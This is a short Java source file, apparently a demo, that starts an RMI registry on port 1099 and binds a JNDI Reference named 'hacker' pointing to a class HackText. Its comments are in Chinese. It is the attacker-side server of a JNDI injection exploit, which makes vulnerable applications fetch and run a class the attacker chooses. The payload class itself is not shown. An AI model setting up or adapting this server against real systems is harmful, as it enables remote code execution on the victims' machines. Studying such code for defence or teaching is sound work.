package com.example.demo.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackService {
    public static void main(String[] args) {
        try {
            // 启动服务
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            // 创建资源
            Reference reference = new Reference("com.example.demo.hacker.HackText", "com.example.demo.hacker.HackText", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            // 绑定资源
            registry.bind("hacker", referenceWrapper);
            System.out.println("服务初始化完成");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
